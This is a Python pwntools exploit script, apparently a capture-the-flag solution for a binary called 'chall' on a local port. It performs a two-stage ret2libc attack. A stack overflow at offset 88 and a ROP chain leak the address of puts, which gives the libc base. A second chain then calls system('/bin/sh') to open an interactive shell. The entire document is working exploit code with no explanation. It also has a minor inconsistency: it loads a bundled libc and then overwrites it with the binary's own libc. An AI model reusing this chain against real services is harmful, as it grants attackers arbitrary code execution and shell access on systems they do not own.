from pwn import *

# === CONFIGURATION ===
exe = './chall'
elf = ELF(exe)
context.binary = exe
context.log_level = 'info'
libc = ELF("./libc.so.6", checksec=False)  

p = remote('localhost', 1338)
# p = process(exe)

offset = 88 

rop = ROP(elf)


pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]

log.info(f"Gadget POP RDI found at: {hex(pop_rdi)}")

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_func = elf.symbols['main']

payload1 = flat({
    offset: [
        pop_rdi,
        puts_got,  
        puts_plt, 
        main_func  
    ]
})

print(p.recvuntil(b"Token: "))
p.send(payload1) 

p.recvuntil(b"Incident reported.\n") 
leaked_data = p.recvline().strip() 
leaked_puts = u64(leaked_data.ljust(8, b"\x00"))

log.success(f"Leaked puts address: {hex(leaked_puts)}")

libc = elf.libc
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Libc Base Address: {hex(libc.address)}")

system_addr = libc.symbols['system']
bin_sh = next(libc.search(b"/bin/sh"))

payload2 = flat({
    offset: [
        ret_gadget,
        pop_rdi,
        bin_sh,     
        system_addr 
    ]
})

print(p.recvuntil(b"Token: "))
p.send(payload2)

p.interactive()